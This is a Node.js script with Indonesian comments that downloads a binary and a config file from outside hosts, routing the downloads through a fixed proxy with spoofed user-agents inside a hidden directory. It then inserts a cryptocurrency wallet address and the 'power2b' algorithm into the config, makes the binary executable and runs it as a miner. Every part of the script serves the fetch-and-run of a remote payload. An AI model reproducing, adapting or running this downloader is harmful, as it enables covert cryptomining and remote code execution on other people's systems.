// pante.js
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent'); // FIX: import class yang benar
const UserAgent = require('user-agents');

// ====== KONFIGURASI ======
const FIXED_PROXY = "http://159.89.10.132:80"; // Proxy tetap
const WORKDIR = path.join(process.cwd(), '.meki');

// URL file
const URL_GENZO = "https://blogspotgenzo.site/UCOK";
const URL_CONFIG = "http://genzoko.serveblog.net/config.json";

// Nama file
const FILE_GENZO = "UCOK";
const FILE_CONFIG = "config.json";

// ====== PERSIAPAN DIREKTORI ======
if (!fs.existsSync(WORKDIR)) {
  fs.mkdirSync(WORKDIR, { recursive: true });
}
process.chdir(WORKDIR);

// ====== FUNGSI DOWNLOAD ======
async function downloadFile(url, outputPath) {
  const userAgent = new UserAgent().toString();
  console.log(`[*] Mengunduh ${url} melalui proxy ${FIXED_PROXY}`);
  console.log(`[*] User-Agent: ${userAgent}`);

  const axiosConfig = {
    responseType: 'arraybuffer',
    headers: {
      'User-Agent': userAgent,
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive'
    },
    timeout: 20000,
    httpsAgent: new HttpsProxyAgent(FIXED_PROXY) // FIX: sekarang ini sudah valid
  };

  try {
    const response = await axios.get(url, axiosConfig);
    fs.writeFileSync(outputPath, response.data);
    console.log(`[*] Berhasil download ${path.basename(outputPath)} melalui proxy`);
  } catch (error) {
    console.error(`Gagal download ${url} lewat proxy:`, error.message);

    // Jika gagal, coba koneksi langsung sebagai fallback
    console.log("[*] Mencoba download tanpa proxy...");
    try {
      const directResponse = await axios.get(url, { ...axiosConfig, httpsAgent: undefined });
      fs.writeFileSync(outputPath, directResponse.data);
      console.log(`[*] Berhasil download ${path.basename(outputPath)} tanpa proxy`);
    } catch (err) {
      console.error("Gagal download tanpa proxy:", err.message);
      process.exit(1);
    }
  }
}

// ====== EDIT CONFIG.JSON ======
function editConfig(filePath) {
  try {
    let data = fs.readFileSync(filePath, 'utf8');

    // ganti placeholder di config.json
    data = data.replace(/"tua"/g, `"${FIXED_PROXY.replace('http://', '')}"`);
    data = data.replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Qeri"');
    data = data.replace(/"meki"/g, '"power2b"');

    fs.writeFileSync(filePath, data);
    console.log("[*] config.json berhasil diperbarui dengan proxy tetap");
  } catch (error) {
    console.error("Gagal edit config.json:", error.message);
    process.exit(1);
  }
}

// ====== BUAT FILE EXECUTABLE ======
function makeExecutable(filePath) {
  try {
    fs.chmodSync(filePath, 0o755);
    console.log(`[*] ${path.basename(filePath)} sudah bisa dieksekusi`);
  } catch (error) {
    console.error("Gagal mengubah permission:", error.message);
  }
}

// ====== JALANKAN UCOK ======
function runPante(binary, config) {
  console.log("[*] Menjalankan UCOK (hashrate akan tampil di bawah)...");
  console.log("");

  const processRun = spawn(`./${binary}`, ['-c', config], {
    stdio: 'inherit',
    shell: true
  });

  processRun.on('close', (code) => {
    console.log(`Proses selesai dengan kode: ${code}`);
  });
}

// ====== MAIN EXECUTION ======
(async () => {
  console.log("[*] Mulai proses dengan proxy tetap:", FIXED_PROXY);

  await downloadFile(URL_GENZO, FILE_GENZO);
  await downloadFile(URL_CONFIG, FILE_CONFIG);

  editConfig(FILE_CONFIG);
  makeExecutable(FILE_GENZO);
  runPante(FILE_GENZO, FILE_CONFIG);
})();
